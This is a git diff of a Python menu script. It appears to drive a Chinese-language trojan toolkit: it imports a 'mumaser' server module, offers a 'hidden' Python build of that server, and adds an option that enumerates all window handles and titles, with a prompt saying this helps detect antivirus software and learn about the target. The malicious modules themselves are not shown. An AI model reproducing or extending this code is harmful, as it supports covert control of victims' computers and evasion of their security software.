@@ -3,9 +3,10 @@ from mod.upload import *
 from mod.ser import *
 from mod.mumaser import *
 from mod.shot import *
+from mod.getproc import *
 import random
 
-ver=1
+ver = 1
 #启动项===========
 upload(ver)
 #check_ip()
@@ -22,20 +23,22 @@ logo1 = '''
         '''
 
 
-
 def print_colorful(text):
-    colors = ['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m']
+    colors = [
+        '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m'
+    ]
     print(random.choice(colors) + text + '\033[0m')
+
 
 for line in logo1.split('\n'):
     print_colorful(line)
-
 
 help = '''
 指令：
     菜单/menu  - 输出所有支持的模块
     退出/exit  - 退出工具
 '''
+
 
 def print_menu():
     functions_name = [
@@ -63,13 +66,14 @@ def print_menu():
     print(help)
     print("==========菜单==========")
     for i in range(0, 20):
-        print(functions_name[i][0].ljust(5) + " " + functions_name[i][1].ljust(15))
+        print(functions_name[i][0].ljust(5) + " " +
+              functions_name[i][1].ljust(15))
 
 
 def input_com():
     print_menu()
     while True:
-        user_input = input('请输入指令: ')
+        user_input = input('请输入指令(menu>>菜单): ')
         if user_input == "exit" or user_input == "退出":
             print("=====再会=====")
             break
@@ -82,7 +86,8 @@ def input_com():
             check_ip()
         elif user_input == "2":
             print("=====选择exe版本或python版本=====")
-            version = input("1| exe版本(完全控制时&界面美观&可选目录)\n2| python版本(隐蔽&自定义)\n输入选择:")
+            version = input(
+                "1| exe版本(完全控制时&界面美观&可选目录)\n2| python版本(隐蔽&自定义)\n输入选择:")
             if version == "1":
                 exeser()
             elif version == "2":
@@ -116,7 +121,16 @@ def input_com():
             else:
                 print("输入错误，请重新输入")
         elif user_input == "5":
-            print("f")
+            print("=====获取所有窗口句柄=====\n" + str(get_all_windows()) +
+                  "\n=====前台窗口句柄=====\n" + str(get_windows()) +
+                  "\n=====前台窗口名称=====\n" + str(get_title(get_windows())))
+            check_all = input("1| 是否显示所有句柄？判断杀软与了解目标或许有用\n2| NO\n输入选择:")
+            if check_all == "1":
+                handles = get_all_windows()
+                for handle in handles:
+                    print("句柄" + str(handle) + "对应:" + get_title(handle))
+            else:
+                print("==========")
         elif user_input == "6":
             print("a")
         elif user_input == "7":
